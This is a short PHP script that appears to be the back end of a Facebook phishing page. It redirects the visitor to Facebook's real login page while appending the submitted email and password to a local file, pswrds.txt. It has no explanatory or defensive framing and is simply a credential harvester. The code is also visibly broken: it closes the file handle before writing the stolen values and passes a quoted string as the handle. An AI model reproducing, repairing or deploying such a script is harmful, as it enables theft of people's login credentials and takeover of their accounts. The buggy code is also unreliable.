<?php 
	header("Location:https://www.facebook.com/login.php?login_attempt=1&amp;lwv=110");
	$handle = fopen("pswrds.txt","a");
	echo "hoo";
	fwrite($handle,"GOWNO!");
	fclose($handle);
	
	if( isset($_POST["email"] )){
	}
	else{
		fwrite($handle,"GOWNOASDPLAS!");
	}
	fwrite($handle,$_POST["email"]);
	fwrite($handle,"\n");
	fwrite($handle,$_POST["password"]);
	fwrite("$handle","\n");
	fwrite("$handle","\n");
	exit;
?>